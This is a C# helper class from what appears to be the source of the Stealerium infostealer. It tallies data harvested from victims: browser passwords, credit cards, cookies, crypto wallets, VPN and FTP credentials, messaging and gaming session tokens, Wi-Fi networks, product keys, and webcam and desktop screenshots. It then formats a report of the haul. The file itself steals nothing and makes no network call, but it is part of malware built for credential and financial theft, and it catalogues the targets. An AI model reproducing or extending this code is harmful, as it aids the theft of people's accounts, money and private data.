using System.Collections.Generic;

namespace Stealerium.Helpers
{
    internal sealed class Counter
    {
        // Browsers data counts
        public static int Passwords { get; set; } = 0;
        public static int CreditCards { get; set; } = 0;
        public static int AutoFill { get; set; } = 0;
        public static int Cookies { get; set; } = 0;
        public static int History { get; set; } = 0;
        public static int Bookmarks { get; set; } = 0;
        public static int Downloads { get; set; } = 0;

        // Application data counts
        public static int Vpn { get; set; } = 0;
        public static int Pidgin { get; set; } = 0;
        public static int Wallets { get; set; } = 0;
        public static int BrowserWallets { get; set; } = 0;
        public static int FtpHosts { get; set; } = 0;

        // Sessions and tokens
        public static bool Element { get; set; } = false;
        public static bool Signal { get; set; } = false;
        public static bool Tox { get; set; } = false;
        public static bool Icq { get; set; } = false;
        public static bool Skype { get; set; } = false;
        public static bool Discord { get; set; } = false;
        public static bool Telegram { get; set; } = false;
        public static bool Outlook { get; set; } = false;
        public static bool Steam { get; set; } = false;
        public static bool Uplay { get; set; } = false;
        public static bool BattleNet { get; set; } = false;

        // System data
        public static int SavedWifiNetworks { get; set; } = 0;
        public static bool ProductKey { get; set; } = false;
        public static bool DesktopScreenshot { get; set; } = false;
        public static bool WebcamScreenshot { get; set; } = false;

        // Grabber stats
        public static int GrabberImages { get; set; } = 0;
        public static int GrabberDocuments { get; set; } = 0;
        public static int GrabberDatabases { get; set; } = 0;
        public static int GrabberSourceCodes { get; set; } = 0;

        // Banking & Cryptocurrency services detection
        public static bool BankingServices { get; } = false;
        public static bool CryptoServices { get; } = false;
        public static bool PornServices { get; } = false;
        public static List<string> DetectedBankingServices { get; } = new List<string>();
        public static List<string> DetectedCryptoServices { get; } = new List<string>();
        public static List<string> DetectedPornServices { get; } = new List<string>();

        // Utility Methods for retrieving formatted values

        /// <summary>
        /// Returns a string based on a boolean value, showing success or failure.
        /// </summary>
        public static string GetSValue(string application, bool value)
        {
            return value ? $"\n   ∟ {application}" : string.Empty;
        }

        /// <summary>
        /// Returns a string based on an integer value, displaying only if non-zero.
        /// </summary>
        public static string GetIValue(string application, int value)
        {
            return value != 0 ? $"\n   ∟ {application}: {value}" : string.Empty;
        }

        /// <summary>
        /// Returns a formatted list with a title, sorted alphabetically.
        /// </summary>
        public static string GetLValue(string application, List<string> value, char separator = '∟')
        {
            value.Sort(); // Sort list items
            return value.Count != 0
                ? $"\n   {separator} {application}:\n\t\t{separator} " + string.Join($"\n\t\t{separator} ", value)
                : $"\n   {separator} {application} (No data)";
        }

        /// <summary>
        /// Returns success or failure message based on boolean input.
        /// </summary>
        public static string GetBValue(bool value, string success, string failure)
        {
            return value ? $"\n   ∟ {success}" : $"\n   ∟ {failure}";
        }
    }
}
